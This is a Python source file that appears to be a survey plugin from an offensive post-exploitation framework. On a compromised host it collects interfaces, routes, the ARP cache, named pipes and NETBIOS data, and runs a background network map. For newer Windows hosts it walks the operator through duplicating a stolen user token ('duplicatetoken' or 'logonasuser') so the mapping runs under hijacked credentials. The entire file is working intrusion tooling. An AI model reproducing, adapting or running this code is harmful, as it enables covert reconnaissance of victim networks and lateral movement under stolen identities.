
from __future__ import print_function
import dsz
import dsz.ui
import ops
import ops.survey.ifconfig
import datetime
import ops.networking.route, ops.networking.connections
import ops.networking.netmap
import ops.project
import ops.survey
import ops.system.systemversion
from optparse import OptionParser
from ops.pprint import pprint

def main():
    parser = OptionParser()
    parser.add_option('--maxage', dest='maxage', default='3600', help='Maximum age of information to use before re-running commands for this module', type='int')
    (options, args) = parser.parse_args()
    ops.survey.print_header('Networking Information')
    print()
    ops.survey.ifconfig.main(options, args)
    ops.survey.print_sub_header('Route table')
    route_data = ops.networking.route.get_routes(maxage=datetime.timedelta(seconds=options.maxage))
    ops.survey.print_agestring(route_data.dszobjage)
    pprint(route_data.route, dictorder=['destination', 'networkmask', 'gateway', 'interface', 'metric', 'origin'], header=['Dest. network', 'Mask', 'Gateway', 'Interface', 'Metric', 'Origin'])
    ops.survey.print_sub_header('ARP table')
    try:
        arp_data = ops.networking.connections.get_arp_cache(maxage=datetime.timedelta(seconds=options.maxage))
        ops.survey.print_agestring(arp_data.dszobjage)
        pprint(arp_data.entry, dictorder=['ip', 'type', 'adapter', 'mac'], header=['IP', 'Type', 'Interface', 'MAC'])
    except ops.cmd.OpsCommandException as ex:
        ops.error('Error occurred running ARP command')
        ops.error(ex)
    ops.survey.print_sub_header('Getting the pipelist in the background')
    pipe_data = ops.networking.connections.get_pipes(maxage=datetime.timedelta(seconds=options.maxage))
    ops.survey.print_sub_header('NETBIOS')
    netbios_cmd = ops.cmd.getDszCommand('netbios', dszquiet=False)
    netbios_cmd.execute()
    if dsz.ui.Prompt('Do you want to run background netmap -minimal?'):
        sysver = ops.system.systemversion.get_os_version(maxage=datetime.timedelta(seconds=options.maxage))
        if (sysver.versioninfo.major > 5):
            dsz.ui.Echo("Netmap will require user credentials (and probably won't work on 2K8)", dsz.WARNING)
            dsz.ui.Echo('If you want to run netmap, you have to go run "duplicatetoken -duplicate" or logonasuser for me', dsz.WARNING)
            get_creds = dsz.ui.Prompt('Do you want to do this?')
            if get_creds:
                userhandle = dsz.ui.GetString('Please enter the user handle you were given by duplicatetoken or logonasuser I should use (i.e. proc1234)')
                netmap_data = ops.networking.netmap.get_minimal_netmap(maxage=datetime.timedelta(seconds=options.maxage), cmd_options={'dszbackground': True, 'dszuser': userhandle})
            else:
                ops.warn("Can't get netmap without creds")
        else:
            netmap_data = ops.networking.netmap.get_minimal_netmap(maxage=datetime.timedelta(seconds=options.maxage), cmd_options={'dszbackground': True})
    else:
        netmap_data = None
if ((__name__ == '__main__') or (__name__ == ops.survey.PLUGIN)):
    main()